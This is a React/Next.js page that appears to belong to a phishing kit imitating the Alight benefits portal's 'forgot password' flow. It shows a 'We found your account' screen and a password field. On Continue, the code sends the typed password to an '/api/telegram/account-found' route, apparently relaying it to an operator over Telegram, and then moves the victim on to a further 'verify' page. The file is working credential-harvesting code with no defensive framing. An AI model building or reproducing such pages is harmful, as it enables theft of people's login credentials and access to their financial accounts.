"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { HelpCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { SiteFooter } from "@/components/site-footer"
import { VerificationHeader } from "@/components/verification-header"
import { Input } from "@/components/ui/input"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Label } from "@/components/ui/label"

export default function ForgotPasswordFoundPage() {
  const router = useRouter()
  const [password, setPassword] = useState("")
  const [verificationMethod, setVerificationMethod] = useState("password")
  const [isLoading, setIsLoading] = useState(false)
  const [isResetLoading, setIsResetLoading] = useState(false)

  const handleContinue = async () => {
    if (isLoading) return
    setIsLoading(true)

    try {
      await fetch("/api/telegram/account-found", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          method: verificationMethod === "password" ? "Password" : "Alight Mobile",
          password: verificationMethod === "password" ? password : undefined,
        }),
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send account found notification:", error)
    }

    await new Promise((r) => setTimeout(r, 1500))
    router.push("/forgot-password-verify")
  }

  const handleResetPasswordClick = async () => {
    if (isResetLoading) return
    setIsResetLoading(true)
    try {
      await fetch("/api/telegram/account-found-reset-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
      }).catch(console.error)
    } catch (error) {
      console.error("Failed to send reset password link notification:", error)
    }

    await new Promise((r) => setTimeout(r, 2000))
    setIsResetLoading(false)
    router.push("/forgot-password-verify")
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <VerificationHeader />
      <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
        <div className="flex items-center gap-2 mb-2">
          <h1 className="text-2xl font-semibold text-gray-900">We found your account</h1>
          <button
            type="button"
            className="text-[#254650] hover:underline flex items-center gap-1"
            aria-label="Help"
          >
            <HelpCircle className="w-4 h-4" />
            <span className="text-sm">Help</span>
          </button>
        </div>
        <p className="text-gray-700 text-sm mb-6">
          For your user ID, enter your password to continue.
        </p>

        <div className="space-y-5">
          <RadioGroup value={verificationMethod} onValueChange={setVerificationMethod}>
            <div className="flex items-center gap-3 flex-wrap">
              <RadioGroupItem value="password" id="password" />
              <Label htmlFor="password" className="text-sm text-gray-900 cursor-pointer">
                Password
              </Label>
              {verificationMethod === "password" && (
                <Input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder=""
                  className="max-w-[300px] h-10 bg-white border-gray-300 rounded-md"
                />
              )}
            </div>
            
            <div className="flex items-center gap-3 mt-4">
              <RadioGroupItem value="mobile" id="mobile" />
              <Label htmlFor="mobile" className="text-sm text-gray-900 cursor-pointer flex items-center gap-1">
                or verify on Alight Mobile
                <HelpCircle className="w-4 h-4 text-[#254650]" />
              </Label>
            </div>
          </RadioGroup>

          <div className="pt-2 text-sm text-gray-700">
            <span>Don&apos;t remember your password? </span>
            <button
              type="button"
              onClick={handleResetPasswordClick}
              disabled={isResetLoading}
              className="text-[#254650] hover:underline disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {isResetLoading ? "Loading..." : "Reset password"}
            </button>
          </div>

          <div className="flex gap-3 pt-4">
            <Button
              onClick={handleContinue}
              disabled={isLoading || (verificationMethod === "password" && !password)}
              className="bg-[#254650] hover:bg-[#1e383f] text-white rounded-md h-9 px-5 text-sm font-medium disabled:bg-gray-300 disabled:text-gray-500 disabled:pointer-events-none"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              type="button"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/forgot-password")}
            >
              Cancel
            </Button>
          </div>
        </div>
      </div>

      <SiteFooter />
    </div>
  )
}
